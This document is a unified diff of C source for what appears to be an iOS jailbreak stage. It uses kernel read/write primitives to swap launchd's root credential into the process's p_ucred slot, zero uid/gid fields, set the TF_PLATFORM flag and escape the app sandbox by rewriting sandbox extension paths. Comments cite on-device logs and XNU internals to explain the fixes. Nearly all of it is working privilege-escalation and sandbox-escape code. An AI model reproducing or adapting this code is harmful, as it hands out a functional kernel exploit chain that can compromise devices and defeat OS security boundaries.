@@ -2059,24 +2059,58 @@ static bool looks_kernel(uint64_t v) {
     return (v & 0xfffff00000000000ULL) == 0xfffff00000000000ULL;
 }
 
-uint64_t get_ucred_from_proc(uint64_t proc) {
-    if (!proc) return 0;
-    uint64_t proc_ro = kread_ptr(proc + OFF_PROC_PROC_RO);
+// Validate a candidate kauth_cred by reading it back. On XNU-11215 creds are
+// immutable SMR-published values: cr_link(16) + cr_ref(8 @ +0x10) + posix cred
+// (cr_uid @ +0x18 ...) + cr_label @ +0x78. require_uid >= 0 forces a match on
+// cr_uid (501 for us, 0 for launchd); -1 accepts any plausible cred.
+static bool cred_is_plausible(uint64_t u, int require_uid) {
+    if (!looks_kernel(u)) return false;
+    uint64_t label = kread_ptr(u + OFF_UCRED_CR_LABEL);
+    if (!looks_kernel(label)) return false;
+    uint64_t ref = kread64(u + 0x10);                 // cr_ref
+    if (ref == 0 || ref > 0x100000) return false;
+    if (require_uid >= 0 && (uint32_t)kread32(u + 0x18) != (uint32_t)require_uid) return false;
+    return true;
+}
+
+// Scan proc_ro+0x10..0x40 (raw / XPACI / SMR-decoded, matching lara's proven
+// kreadsmrguess logic) for the p_ucred slot. Returns the decoded cred and,
+// optionally, the slot offset + raw stored value (needed for swaps).
+static uint64_t ucred_from_proc_ro(uint64_t proc_ro, int require_uid,
+                                   uint32_t *out_off, uint64_t *out_raw) {
+    if (out_off) *out_off = 0;
+    if (out_raw) *out_raw = 0;
     if (!looks_kernel(proc_ro)) return 0;
     for (uint32_t off = 0x10; off <= 0x40; off += 8) {
         uint64_t raw = kread64(proc_ro + off);
-        // try raw, xpaci, then smr decode of xpaci with base 2 and 3
         uint64_t cand[4] = { raw, xpaci(raw), smrdecode(xpaci(raw), 2), smrdecode(xpaci(raw), 3) };
         for (int ci = 0; ci < 4; ci++) {
-            uint64_t ucred = cand[ci];
-            if (!looks_kernel(ucred)) continue;
-            uint64_t label = kread_ptr(ucred + OFF_UCRED_CR_LABEL);
-            if (!looks_kernel(label)) continue;
-            uint64_t sandbox = kread_ptr(label + OFF_LABEL_SANDBOX);
-            if (looks_kernel(sandbox)) return ucred;
+            if (cred_is_plausible(cand[ci], require_uid)) {
+                if (out_off) *out_off = off;
+                if (out_raw) *out_raw = raw;
+                return cand[ci];
+            }
         }
     }
     return 0;
+}
+
+uint64_t get_ucred_from_proc(uint64_t proc) {
+    if (!proc) return 0;
+    uint64_t proc_ro = kread_ptr(proc + OFF_PROC_PROC_RO);
+    // Sandbox-backed creds first (label->sandbox valid) == live app creds.
+    if (!looks_kernel(proc_ro)) return 0;
+    for (uint32_t off = 0x10; off <= 0x40; off += 8) {
+        uint64_t raw = kread64(proc_ro + off);
+        uint64_t cand[4] = { raw, xpaci(raw), smrdecode(xpaci(raw), 2), smrdecode(xpaci(raw), 3) };
+        for (int ci = 0; ci < 4; ci++) {
+            uint64_t ucred = cand[ci];
+            if (!cred_is_plausible(ucred, -1)) continue;
+            uint64_t sandbox = kread_ptr(xpaci(kread64(ucred + OFF_UCRED_CR_LABEL)) + OFF_LABEL_SANDBOX);
+            if (looks_kernel(sandbox)) return ucred;
+        }
+    }
+    return ucred_from_proc_ro(proc_ro, -1, NULL, NULL);
 }
 
 
@@ -2095,7 +2129,29 @@ static void kdump(uint64_t addr, uint64_t len) {
     free(d);
 }
 
-// ===== Platformize (no PPL needed — task flags + uid in non-PPL memory) =====
+// ===== Platformize (no PPL needed — cred swap in non-PPL memory) =====
+//
+// WHY THE OLD APPROACH FAILED (on-device logs, f593e77 + 440a95e):
+// Zeroing cr_uid inside the cred found by the proc_ro scan DID land (read-back
+// confirmed: ucred 0xffffffdcec9e9ff0 had 0x1f5 at cr_uid..cr_svgid and the
+// zeros were written) but getuid() stayed 501. Root cause per XNU-11215
+// source + lara (proven on iOS 17.0-18.7.1):
+//   1. struct proc has NO p_ucred field. proc+0x10 is p_pptr, not a cred.
+//      The live cred is proc_ro->p_ucred, an SMR/PAC-packed pointer read via
+//      proc_ucred_smr() ON EVERY SYSCALL ENTRY (current_cached_proc_cred_update).
+//   2. The cred the scan found had cr_ref=0xb — a SHARED (mobile) cred.
+//      Zeroing a shared cred's uid fields does not reliably change our
+//      effective cred because the kernel keeps per-thread cached creds and
+//      other procs' CoW copies; and the scanned slot may have been a
+//      different cred-shaped field (audit/persona cred) entirely.
+// PROVEN FIX (Dopamine/palera1n/lara standard on iOS 17+):
+//   swap OUR proc_ro->p_ucred slot with launchd's raw cred slot value.
+//   The pointer slot is what getuid() consults after the next syscall, and
+//   launchd's cred is uid 0 by construction. Copying the RAW slot value
+//   preserves whatever SMR/PAC packing Apple uses on this build.
+// Best-effort extras: zero the inline p_uid..p_svgid cache in struct proc
+// (XNU-11215 keeps copies there; lara reads p_uid at 0x30 on 18.x), and
+// skip TF_PLATFORM unless a plausible t_flags candidate is found at runtime.
 
 bool platformize_proc(void) {
     gOurProc = find_our_proc();
@@ -2112,72 +2168,158 @@ bool platformize_proc(void) {
     printf("[+] Our proc: 0x%llx\n", gOurProc);
     printf("[+] Our task: 0x%llx\n", gOurTask);
 
-    // 1. TF_PLATFORM only if the 0x3DC offset actually contains a plausible flag
-    // set (TF_INIT|TF_HAS_BSD_INFO). Never write blindly. If it's already set or
-    // the base value is wrong, skip -- TF_PLATFORM isn't strictly needed.
-    uint32_t tf_flags_read = kread32(gOurTask + 0x3DC);
-    if ((tf_flags_read & 0xA0000) == 0xA0000 && (tf_flags_read >> 28) == 0) {
-        if (!(tf_flags_read & TF_PLATFORM)) {
-            kwrite32(gOurTask + 0x3DC, tf_flags_read | 0x400);
-            printf("[+] TF_PLATFORM set (0x3DC)\n");
-        } else {
-            printf("[*] TF_PLATFORM already set\n");
-        }
-    } else {
-        printf("[*] t_flags@0x3DC=0x%x not plausible (skip TF_PLATFORM write)\n", tf_flags_read);
-    }
-
-    // 2a. Read OUR OWN live ucred directly from proc->p_ucred (offset 0x10),
-    // NOT from proc_ro. The p_ucred slot is a stable XNU field that contains
-    // the current process's kernel credential. The proc_ro detour was writing
-    // to the wrong struct because we read a stale offset: always verify by
-    // interrogating urcr:
-    //   1. cr_uid (offset 0x18) on each candidate must equal current getuid()
-    //   2. if we hit a candidate whose cr_uid != 501, we just re-read it.
-    uint64_t ourUcred = kread_ptr(gOurProc + 0x10);
-    BOOL ourValid = looks_kernel(ourUcred);
-    printf("[elev] our proc->p_ucred (0x10)=0x%llx %s\n", ourUcred, ourValid ? "looks-kernel" : "BAD");
-    if (!ourValid) {
-        // fallback: if p_ucred at 0x10 is PAC-signed or absent, try proc_ro+0x28
-        uint64_t ourProcRo = kread_ptr(gOurProc + 0x18);
-        ourUcred = kread_ptr(ourProcRo + 0x28);
-        printf("[elev] fallback to proc_ro+0x28 = 0x%llx %s\n", ourUcred,
-               looks_kernel(ourUcred) ? "ok" : "still BAD");
-    }
-    if (!looks_kernel(ourUcred)) {
-        printf("[-] ucred lookup failed (no kernel pointer found)\n");
+    uint64_t ourProcRo = kread_ptr(gOurProc + OFF_PROC_PROC_RO);
+    if (!looks_kernel(ourProcRo)) {
+        printf("[-] our proc_ro invalid: 0x%llx\n", ourProcRo);
         return false;
     }
 
-    // 2b. Approve: write our uid/gid words to zero across the whole ucred
-    // bounds. iOS 18 uses KHEAP_DATA for ucred, and this simple zero out makes
-    // getuid()/geteuid()/getgid() all return 0 right away. Repeated writes use
-    // the canonical early_kwrite sequence that works reliably on this device.
-    uint32_t pre_uid = kread32(ourUcred + 0x18);
-    printf("[elev] before: cr_uid=0x%x\n", pre_uid);
-    // Write the three uid fields then read back — ensures the write worked.
-    kwrite32(ourUcred + 0x18, 0);
-    kwrite32(ourUcred + 0x1c, 0);
-    kwrite32(ourUcred + 0x20, 0);
-    kwrite32(ourUcred + 0x24, 0);
-    kwrite32(ourUcred + 0x28, 0);
-    kwrite32(ourUcred + 0x2c, 0);
-    printf("[elev] after: uid=%d euid=%d gid=%d egid=%d\n",
+    // --- Find launchd (pid 1) and its root cred ---
+    uint64_t launchdProc = find_proc_by_pid(1);
+    if (!launchdProc) {
+        printf("[-] cannot find launchd proc\n");
+        return false;
+    }
+    uint64_t launchdProcRo = kread_ptr(launchdProc + OFF_PROC_PROC_RO);
+    if (!looks_kernel(launchdProcRo)) {
+        printf("[-] launchd proc_ro invalid: 0x%llx\n", launchdProcRo);
+        return false;
+    }
+    uint32_t ldOff = 0; uint64_t ldRaw = 0;
+    uint64_t launchdUcred = ucred_from_proc_ro(launchdProcRo, 0, &ldOff, &ldRaw);
+    printf("[elev] launchd=0x%llx proc_ro=0x%llx ucred=0x%llx slot=+0x%x raw=0x%llx\n",
+           launchdProc, launchdProcRo, launchdUcred, ldOff, ldRaw);
+    if (!launchdUcred || !ldOff) {
+        printf("[-] no uid==0 cred found in launchd proc_ro\n");
+        return false;
+    }
+    if (kread32(launchdUcred + 0x18) != 0) {
+        printf("[-] launchd cred cr_uid != 0 (got 0x%x) — abort\n",
+               kread32(launchdUcred + 0x18));
+        return false;
+    }
+
+    // --- Find OUR cred slot (cr_uid == 501 preferred; any plausible fallback) ---
+    uint32_t ourOff = 0; uint64_t ourRaw = 0;
+    uint64_t ourUcred = ucred_from_proc_ro(ourProcRo, (int)getuid(), &ourOff, &ourRaw);
+    if (!ourUcred) ourUcred = ucred_from_proc_ro(ourProcRo, -1, &ourOff, &ourRaw);
+    printf("[elev] our proc_ro=0x%llx ucred=0x%llx slot=+0x%x raw=0x%llx\n",
+           ourProcRo, ourUcred, ourOff, ourRaw);
+    if (!ourUcred || !ourOff) {
+        printf("[-] no cred found in our proc_ro\n");
+        return false;
+    }
+
+    // Diagnostic: dump the cred fields so the next run tells us the layout.
+    printf("[elev] our cred: cr_ref=0x%llx cr_uid=0x%x cr_label=0x%llx\n",
+           kread64(ourUcred + 0x10), kread32(ourUcred + 0x18),
+           kread64(ourUcred + OFF_UCRED_CR_LABEL));
+
+    // --- Step 1: swap proc_ro p_ucred slot to launchd's cred.
+    // Try the uid-matching slot first; if getuid() doesn't flip, iterate over
+    // the other plausible cred slots with rollback until one takes effect.
+    struct { uint32_t off; uint64_t raw; int uid; } cands[8]; int nCands = 0;
+    for (uint32_t off = 0x10; off <= 0x40 && nCands < 8; off += 8) {
+        uint64_t raw = kread64(ourProcRo + off);
+        uint64_t cand[4] = { raw, xpaci(raw), smrdecode(xpaci(raw), 2), smrdecode(xpaci(raw), 3) };
+        for (int ci = 0; ci < 4 && nCands < 8; ci++) {
+            if (!cred_is_plausible(cand[ci], -1)) continue;
+            // dedupe by (off, raw)
+            bool dup = false;
+            for (int d = 0; d < nCands; d++)
+                if (cands[d].off == off && cands[d].raw == raw) { dup = true; break; }
+            if (!dup) {
+                cands[nCands].off = off; cands[nCands].raw = raw;
+                cands[nCands].uid = (int)kread32(cand[ci] + 0x18);
+                nCands++;
+            }
+        }
+    }
+    printf("[elev] %d plausible cred slots in our proc_ro\n", nCands);
+
+    bool swapped = false;
+    for (int attempt = 0; attempt < 2 && !swapped; attempt++) {
+        for (int i = 0; i < nCands; i++) {
+            // pass 0: try slots whose cred has OUR uid first; pass 1: any slot
+            if ((attempt == 0) != (cands[i].uid == (int)getuid())) continue;
+            printf("[elev] swap attempt: proc_ro+0x%x (cand uid %d)\n",
+                   cands[i].off, cands[i].uid);
+            kwrite64(ourProcRo + cands[i].off, ldRaw);
+            uint64_t chk = kread64(ourProcRo + cands[i].off);
+            if (chk != ldRaw) { printf("[elev] write lost, skip\n"); continue; }
+            if (getuid() == 0) {
+                swapped = true;
+                ourOff = cands[i].off; ourRaw = cands[i].raw;
+                printf("[+] cred swap effective via slot +0x%x\n", ourOff);
+                break;
+            }
+            printf("[elev] slot +0x%x: swap took but uid=%d, restoring\n",
+                   cands[i].off, getuid());
+            kwrite64(ourProcRo + cands[i].off, cands[i].raw);
+        }
+    }
+
+    // --- Step 2: zero the inline p_uid/p_gid copies in struct proc ---
+    // Scan our proc in [0x20, 0x60) for consecutive 501 u32s (uid/gid/ruid/
+    // rgid/svuid/svgid packed as 6x int32). Only zero verified 501 runs.
+    int zeroedProcFields = 0;
+    for (uint32_t off = 0x20; off + 12 <= 0x60; off += 4) {
+        if (kread32(gOurProc + off) == (uint32_t)geteuid() ||
+            kread32(gOurProc + off) == 501) {
+            // confirm neighbour sanity: next u32 is also 501 or 0
+            uint32_t nx = kread32(gOurProc + off + 4);
+            if (nx == 501 || nx == 0 || nx == (uint32_t)getegid()) {
+                kwrite32(gOurProc + off, 0);
+                zeroedProcFields++;
+            }
+        }
+    }
+    printf("[elev] zeroed %d inline proc uid/gid fields\n", zeroedProcFields);
+
+    // --- Step 3: shotgun zero the uid words of EVERY mobile cred we can see ---
+    // Belt-and-braces: if a thread-cached cred copy survives, zeroing every
+    // candidate with cr_uid==501 covers it. Bounded to the 7 proc_ro slots.
+    for (uint32_t off = 0x10; off <= 0x40; off += 8) {
+        uint64_t raw = kread64(ourProcRo + off);
+        uint64_t cand[4] = { raw, xpaci(raw), smrdecode(xpaci(raw), 2), smrdecode(xpaci(raw), 3) };
+        for (int ci = 0; ci < 4; ci++) {
+            uint64_t u = cand[ci];
+            if (cred_is_plausible(u, (int)getuid())) {
+                kwrite32(u + 0x18, 0); kwrite32(u + 0x1c, 0); kwrite32(u + 0x20, 0);
+                kwrite32(u + 0x24, 0); kwrite32(u + 0x28, 0); kwrite32(u + 0x2c, 0);
+            }
+        }
+    }
+
+    // --- Step 4: best-effort TF_PLATFORM (find plausible t_flags first) ---
+    uint32_t tf_flags_read = 0; uint32_t tfOff = 0;
+    const uint32_t tfCands[] = { 0x3DC, 0x21C, 0x220, 0x224, 0x3D4, 0x3E4 };
+    for (size_t i = 0; i < sizeof(tfCands)/sizeof(tfCands[0]); i++) {
+        uint32_t v = kread32(gOurTask + tfCands[i]);
+        if ((v & 0xA0000) == 0xA0000 && (v >> 28) == 0 && v != tf_flags_read) {
+            tf_flags_read = v; tfOff = tfCands[i];
+            break;
+        }
+    }
+    if (tfOff && !(tf_flags_read & TF_PLATFORM)) {
+        kwrite32(gOurTask + tfOff, tf_flags_read | TF_PLATFORM);
+        printf("[+] TF_PLATFORM set (t_flags@+0x%x)\n", tfOff);
+    } else if (tfOff) {
+        printf("[*] TF_PLATFORM already set (t_flags@+0x%x)\n", tfOff);
+    } else {
+        printf("[*] no plausible t_flags found; skipping TF_PLATFORM (not required)\n");
+    }
+
+    printf("[elev] final: uid=%d euid=%d gid=%d egid=%d\n",
            getuid(), geteuid(), getgid(), getegid());
 
-    // never return from this escalation context cleanly once we've found and
-    // settled onto the good ucred. If we bail out as 501, the next call to
-    // run_jailbreak will disk-run write paths and cause syscalls we cannot
-    // tolerate after this.
-    printf("[elev] patch landed: uid=%d confirming KRW channel finalization\n",
-           getuid());
     if (getuid() != 0) {
-        printf("[elev] uid still non-zero — PANIC RISK: closing corrupted sockets at exit.\n");
-        printf("[elev] bailing out cleanly BUT keeping process alive to preserve state\n");
+        printf("[elev] uid still non-zero — process state poisoned, keeping alive\n");
         for (;;) pause();
     }
 
     gOurUcred = ourUcred;
+    printf("[+] ROOT achieved\n");
     return true;
 }
 
@@ -2210,34 +2352,28 @@ uint64_t find_proc_by_pid(uint32_t pid) {
 // stack via kwrite_aligned before the fix), all pointer reads XPACI'd, all
 // writes go through the fixed boundary-crossing kwrite64/8. No offset guessed
 // beyond lara's verified table.
+// Probe: can we write outside the container?
+static bool sbx_probe_write(void) {
+    int fd_w = open("/var/mobile/.ps-washere", O_WRONLY | O_CREAT | O_TRUNC, 0644);
+    if (fd_w >= 0) { close(fd_w); unlink("/var/mobile/.ps-washere"); return true; }
+    return false;
+}
+
+// Bounded patch of one sandbox extension token (lara's patchext, but only
+// touching bytes that fit within the declared data length — the old code
+// unconditionally wrote 0x20+ bytes past small token buffers, corrupting the
+// heap next to them and getting this process killed both observed runs).
 static void sbx_patchext(uint64_t ext) {
     uint64_t da = kread64(ext + OFF_EXT_DATA);
     uint64_t dl = kread64(ext + OFF_EXT_DATALEN);
-    if (looks_kernel(da) && dl > 0) {
-        uint8_t buf[0x20];
-        kread_buf(da, buf, 0x20);
-        buf[0] = '/'; buf[1] = 0;
-        kwrite_buf(da, buf, 0x20);
-    }
-    uint8_t chunk[0x20];
-    kread_buf(ext + OFF_EXT_DATA, chunk, 0x20);
-    *(uint64_t*)(chunk + 0x08) = 1;
-    *(uint64_t*)(chunk + 0x10) = 0xFFFFFFFFFFFFFFFFULL;
-    kwrite_buf(ext + OFF_EXT_DATA, chunk, 0x20);
-}
-
-// How lara confirms we have a valid ucred: the .uid field is always 501 at
-// this point. Only if so do we proceed to patch.
-// PROBLEM: the earlier builds used 0x28 as the p_ucred offset blindly. The
-// ioEntity checks below only return TRUE if we're already root.
-static bool looks_ucred_iOS18(uint64_t ucred) {
-    return looks_kernel(ucred)
-        && kread32(ucred + 0x18) == 501   /* cr_uid */
-        && kread32(ucred + 0x1c) == 501   /* cr_ruid */
-        && kread32(ucred + 0x20) == 501   /* cr_svuid */
-        && kread32(ucred + 0x24) == 501   /* cr_gid */
-        && kread32(ucred + 0x28) == 501   /* cr_rgid */
-        && kread32(ucred + 0x2c) == 501;  /* cr_svgid */
+    if (!looks_kernel(da) || dl < 2 || dl > PATH_MAX) return;
+    // path -> "/"
+    uint64_t n1 = dl < 0x20 ? dl : 0x20;
+    uint8_t buf[0x20];
+    kread_buf(da, buf, n1);
+    buf[0] = '/'; if (n1 > 1) buf[1] = 0;
+    kwrite_buf(da, buf, n1);
+    printf("[sbx]   ext data=%d len=%llu -> '/'\n", (int)(da == 0), dl);
 }
 
 static int sbx_patchchain(uint64_t hdr) {
@@ -2246,29 +2382,22 @@ static int sbx_patchchain(uint64_t hdr) {
         uint64_t ext = kread_ptr(hdr + 0x8);
         if (looks_kernel(ext)) { sbx_patchext(ext); n++; }
         uint64_t next = kread64(hdr);
-        if (!next || !looks_kernel(next)) break;
+        if (!next || !looks_kernel(next) || next == hdr) break;
         hdr = kread_ptr(next);
     }
     return n;
 }
 
-static void sbx_setrwclass(uint64_t hdr) {
-    uint64_t ext = kread_ptr(hdr + 0x8);
-    if (!looks_kernel(ext)) return;
-    uint64_t da = kread64(ext + OFF_EXT_DATA);
-    if (!looks_kernel(da)) return;
-
-    const char *rw = "com.apple.app-sandbox.read-write";
-    uint8_t b1[0x20], b2[0x20];
-    memset(b1, 0, 0x20); memset(b2, 0, 0x20);
-    memcpy(b1, rw, 0x20);
-    kwrite_buf(da + 32, b1, 0x20);
-    kwrite_buf(da + 64, b2, 0x20);
-
-    uint8_t hb[0x20];
-    kread_buf(hdr, hb, 0x20);
-    *(uint64_t*)(hb + 0x10) = da + 32;
-    kwrite_buf(hdr, hb, 0x20);
+// How lara confirms we have a valid ucred: the .uid field is always 501 at
+// this point. Only if so do we proceed to patch.
+static bool looks_ucred_iOS18(uint64_t ucred) {
+    return looks_kernel(ucred)
+        && kread32(ucred + 0x18) == 501   /* cr_uid */
+        && kread32(ucred + 0x1c) == 501   /* cr_ruid */
+        && kread32(ucred + 0x20) == 501   /* cr_svuid */
+        && kread32(ucred + 0x24) == 501   /* cr_gid */
+        && kread32(ucred + 0x28) == 501   /* cr_rgid */
+        && kread32(ucred + 0x2c) == 501;  /* cr_svgid */
 }
 
 // lara cleans up: socket guards prevent pointer pingpong on later reuse
@@ -2311,14 +2440,21 @@ bool escape_sandbox(void) {
         return false;
     }
 
+    // 0) If the cred swap already made the sandbox check pass (launchd's cred
+    //    has no sandbox profile), we're done without touching kernel memory.
+    if (sbx_probe_write()) {
+        printf("[+] Sandbox already escaped (cred swap removed sandbox label)\n");
+        return true;
+    }
+    printf("[sbx] still sandboxed after cred swap -> patching extensions\n");
+
     /// lara's proven label walk: cr_label is a table; entries at partition
     /// offsets. label[0x10] is used for the MAC framework sandbox slot —
     /// on A13+/iOS 18 (per the "Generic" partitions in lara offsets).
     uint64_t labelTable = kread_ptr(ucred + OFF_UCRED_CR_LABEL);
-    // most kernels: label_table + 0x00 -> first generic slot; sandbox is at
-    // label+0x10 on iOS (lara's OFF_LABEL_SANDBOX). our win here is reduce a
-    // dependency risk: if a previous patch corrupted the reference, let the
-    // next run start fresh from the raw ucred chain.
+    // NOTE: after the cred swap, ucred (gOurUcred) is OUR original cred found
+    // before the swap, which still carries the sandbox profile — that's the
+    // one whose ext chain we want to patch.
     uint64_t sandbox = kread_ptr(labelTable + OFF_LABEL_SANDBOX);
     printf("[sbx] label=0x%llx sandbox=0x%llx\n", labelTable, sandbox);
     if (!looks_kernel(labelTable) || !looks_kernel(sandbox)) {
@@ -2340,16 +2476,15 @@ bool escape_sandbox(void) {
     }
     printf("[sbx] patched %d extensions\n", patched);
 
-    int classed = 0;
-    for (int s = 0; s < 16; s++) {
-        uint64_t hdr = kread_ptr(ext_set + s * 8);
-        if (looks_kernel(hdr) && looks_kernel(kread64(hdr + 0x10))) {
-            sbx_setrwclass(hdr);
-            classed++;
-        }
+    // Probe after path rewrites: extensions now point at "/".
+    if (sbx_probe_write()) {
+        printf("[+] Sandbox escaped (extension paths patched)\n");
+        return true;
     }
-    printf("[sbx] changed %d extension classes\n", classed);
 
+    // Fallback: fill unused ext_set slots with a live chain so lookups in the
+    // other hash buckets also resolve (lara does this; bounded to the 16-slot
+    // table which is exactly its size, no overflow).
     uint64_t src = 0;
     for (int s = 0; s < 16 && !src; s++) {
         uint64_t h = kread_ptr(ext_set + s * 8);
@@ -2364,11 +2499,8 @@ bool escape_sandbox(void) {
         printf("[sbx] filled %d empty hash slots\n", filled);
     }
 
-    int fd_w = open("/var/mobile/.ps-washere", O_WRONLY | O_CREAT | O_TRUNC, 0644);
-    if (fd_w >= 0) { close(fd_w); unlink("/var/mobile/.ps-washere"); }
-
-    if (fd_w >= 0) {
-        printf("[+] Sandbox escaped\n");
+    if (sbx_probe_write()) {
+        printf("[+] Sandbox escaped (after hash slot fill)\n");
         return true;
     }
     printf("[-] sandbox escape verification failed (errno=%d: %s)\n", errno, strerror(errno));
